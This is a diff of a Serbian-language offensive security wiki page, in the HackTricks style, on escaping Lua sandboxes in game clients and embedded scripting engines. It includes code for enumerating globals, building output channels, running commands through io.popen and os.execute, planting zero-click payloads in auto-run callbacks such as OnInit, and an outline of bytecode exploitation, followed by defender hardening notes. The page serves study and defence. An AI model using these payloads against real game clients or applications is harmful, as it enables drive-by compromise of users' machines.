@@ -1,18 +1,18 @@
-# Bypass Lua sandboxes (embedded VMs, game clients)
+# Zaobilaženje Lua sandboxes (embedded VMs, game clients)
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Ova stranica prikuplja praktične tehnike za enumeraciju i izbijanje iz Lua "sandboxes" ugrađenih u aplikacije (posebno game clients, plugins, ili in-app scripting engines). Mnogi engine-i izlažu ograničeno Lua okruženje, ali ostavljaju moćne globals dostupnim, što omogućava izvršavanje proizvoljnih komandi ili čak native memory corruption kada su bytecode loaders izloženi.
+Ova stranica prikuplja praktične tehnike za enumeraciju i bekstvo iz Lua "sandboxes" ugrađenih u aplikacije (notably game clients, plugins, or in-app scripting engines). Mnogi engine-i izlažu ograničeno Lua okruženje, ali ostavljaju moćne globale dostupne koje omogućavaju proizvoljno izvršavanje komandi ili čak korupciju native memorije kada su izloženi bytecode loaders.
 
-Key ideas:
+Ključne ideje:
 - Posmatrajte VM kao nepoznato okruženje: enumerišite _G i otkrijte koje opasne primitive su dostupne.
-- Kada su stdout/print blokirani, zloupotrebite bilo koji in-VM UI/IPC kanal kao output sink za posmatranje rezultata.
-- Ako su io/os izloženi, često imate direktno izvršavanje komandi (io.popen, os.execute).
-- Ako su load/loadstring/loadfile izloženi, izvršavanje pažljivo kreiranog Lua bytecode-a može potkopati sigurnost memorije u nekim verzijama (≤5.1 verifikatori se mogu zaobići; 5.2 je uklonio verifier), omogućavajući naprednu eksploataciju.
+- Kada su stdout/print blokirani, zloupotrebite bilo koji in-VM UI/IPC kanal kao output sink da posmatrate rezultate.
+- Ako je io/os izložen, često imate direktno izvršavanje komandi (io.popen, os.execute).
+- Ako su load/loadstring/loadfile izloženi, izvršavanje pažljivo kreiranog Lua bytecode-a može narušiti sigurnost memorije u nekim verzijama (≤5.1 verifikatori su zaobiđivi; 5.2 je uklonio verifier), omogućavajući naprednu eksploataciju.
 
-## Enumerate the sandboxed environment
+## Enumerišite sandboxed okruženje
 
-- Dump globalnog okruženja da inventarišete dostupne tables/functions:
+- Izdumpajte globalno okruženje da inventarišete dostupne tabele/funkcije:
 ```lua
 -- Minimal _G dumper for any Lua sandbox with some output primitive `out`
 local function dump_globals(out)
@@ -22,7 +22,7 @@ out(tostring(k) .. " = " .. tostring(v))
 end
 end
 ```
-- Ako print() nije dostupan, preusmeri in-VM kanale. Primer iz MMO housing script VM gde chat izlaz radi samo nakon poziva zvuka; sledeći kod gradi pouzdanu funkciju za ispis:
+- Ako print() nije dostupan, iskoristite in-VM kanale. Primer iz MMO housing script VM-a gde chat izlaz radi samo nakon poziva zvuka; sledeći kod pravi pouzdanu izlaznu funkciju:
 ```lua
 -- Build an output channel using in-game primitives
 local function ButlerOut(label)
@@ -39,11 +39,11 @@ local out = ButlerOut(1)
 dump_globals(out)
 end
 ```
-Generalizujte ovaj obrazac za vaš target: svaki textbox, toast, logger, ili UI callback koji prihvata stringove može da služi kao stdout za reconnaissance.
+Generalizujte ovaj obrazac za vaš cilj: bilo koji textbox, toast, logger ili UI callback koji prihvata stringove može poslužiti kao stdout za reconnaissance.
 
-## Direct command execution if io/os is exposed
+## Direct command execution ako su io/os izloženi
 
-Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno odmah dobijate command execution:
+Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno odmah imate command execution:
 ```lua
 -- Windows example
 io.popen("calc.exe")
@@ -52,30 +52,30 @@ io.popen("calc.exe")
 os.execute("/usr/bin/id")
 io.popen("/bin/sh -c 'id'")
 ```
-Napomene:
-- Izvršavanje se dešava unutar client process; mnogi anti-cheat/antidebug slojevi koji blokiraju external debuggers neće sprečiti in-VM process creation.
+Notes:
+- Izvršavanje se dešava unutar klijentskog procesa; mnogi anti-cheat/antidebug slojevi koji blokiraju external debuggers neće sprečiti in-VM process creation.
 - Takođe proveri: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).
 
 ## Zero-click triggers via auto-run callbacks
 
-Ako host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
+Ako host application šalje skripte klijentima i VM izlaže auto-run hooks (npr. OnInit/OnLoad/OnEnter), postavi svoj payload tamo za drive-by compromise čim se skripta učita:
 ```lua
 function OnInit()
 io.popen("calc.exe") -- or any command
 end
 ```
-Bilo koji ekvivalentni callback (OnLoad, OnEnter, etc.) generalizuje ovu tehniku kada se skripte automatski prenose i izvršavaju na klijentu.
+Bilo koji ekvivalentan callback (OnLoad, OnEnter, itd.) generalizuje ovu tehniku kada se skripte automatski prenose i izvršavaju na klijentu.
 
-## Opasne primitive za traženje tokom recon
+## Opasni primitivni elementi koje treba tražiti tokom recon
 
-Tokom enumeracije _G, posebno obratite pažnju na:
-- io, os: io.popen, os.execute, rad sa fajlovima (file I/O), pristup env varijablama (env access).
-- load, loadstring, loadfile, dofile: izvršavaju izvor ili bytecode; omogućavaju učitavanje nepouzdanog bytecode-a.
+Tokom _G enumeracije, posebno tražite:
+- io, os: io.popen, os.execute, file I/O, pristup env.
+- load, loadstring, loadfile, dofile: izvršava source ili bytecode; podržava učitavanje nepouzdanog bytecode-a.
 - package, package.loadlib, require: dinamičko učitavanje biblioteka i površina modula.
-- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo i hooks.
+- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, i hooks.
 - LuaJIT-only: ffi.cdef, ffi.load za direktno pozivanje nativnog koda.
 
-Minimalni primeri upotrebe (ako su dostižni):
+Minimalni primeri upotrebe (ako su dostupni):
 ```lua
 -- Execute source/bytecode
 local f = load("return 1+1")
@@ -90,20 +90,20 @@ print(g())
 local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
 local foo = mylib()
 ```
-## Opcionalna eskalacija: zloupotreba Lua bytecode loaders
+## Opcionalna eskalacija: zloupotreba Lua bytecode loadera
 
-Kada su load/loadstring/loadfile dostupni, ali su io/os ograničeni, izvršavanje pažljivo izrađenog Lua bytecode-a može dovesti do otkrivanja memorije i primitiva za korupciju. Ključne činjenice:
-- Lua ≤ 5.1 je isporučivao bytecode verifier koji ima poznate bypasses.
-- Lua 5.2 je potpuno uklonio verifier (službeni stav: aplikacije treba da odbijaju precompiled chunks), što proširuje površinu napada ako bytecode loading nije zabranjen.
-- Tipični tokovi rada: leak pointers via in-VM output, craft bytecode to create type confusions (npr. oko FORLOOP ili drugih opcode-ova), zatim pivot na arbitrary read/write ili native code execution.
+Kada su load/loadstring/loadfile dostupni, a io/os ograničeni, izvršavanje pažljivo konstruisanog Lua bytecode-a može dovesti do otkrivanja sadržaja memorije i primitiva za korupciju. Ključne činjenice:
+- Lua ≤ 5.1 je dolazio sa bytecode verifier-om koji ima poznate bypasses.
+- Lua 5.2 je u potpunosti uklonio verifier (zvanični stav: aplikacije bi trebalo jednostavno da odbace precompiled chunks), čime se proširuje attack surface ako bytecode loading nije zabranjen.
+- Tipični workflow-i: leak pointers putem in-VM output-a, konstruisati bytecode za stvaranje type confusions (npr. oko FORLOOP ili drugih opcode-a), zatim pivot na arbitrary read/write ili native code execution.
 
-Ovaj put je specifičan za engine/verziju i zahteva RE. Pogledajte references za dubinske analize, exploitation primitives i primerke gadgetry u igrama.
+Ovaj put je specifičan za engine/version i zahteva RE. Pogledajte references za deep dives, exploitation primitives i primere gadgetry u games.
 
-## Beleške za detekciju i ojačavanje (za odbranu)
+## Detection and hardening notes (for defenders)
 
-- Na serverskoj strani: odbaciti ili prepisati user scripts; allowlist safe APIs; ukloniti ili bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
-- Na klijentskoj strani: pokretati Lua sa minimalnim _ENV, zabraniti bytecode loading, ponovo uvesti strogi bytecode verifier ili provere potpisa, i blokirati kreiranje procesa iz klijentskog procesa.
-- Telemetrija: alarmirati pri gameclient → child process creation ubrzo nakon učitavanja skripte; korrelirati sa UI/chat/script događajima.
+- Server side: odbaciti ili prepisati user scripts; allowlist safe APIs; strip ili bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
+- Client side: pokretati Lua sa minimalnim _ENV-om, zabraniti bytecode loading, ponovo uvesti strogi bytecode verifier ili provere potpisa, i blokirati kreiranje procesa iz procesa klijenta.
+- Telemetry: alert na gameclient → child process creation ubrzo nakon učitavanja skripte; korelirati sa UI/chat/script događajima.
 
 ## References
 
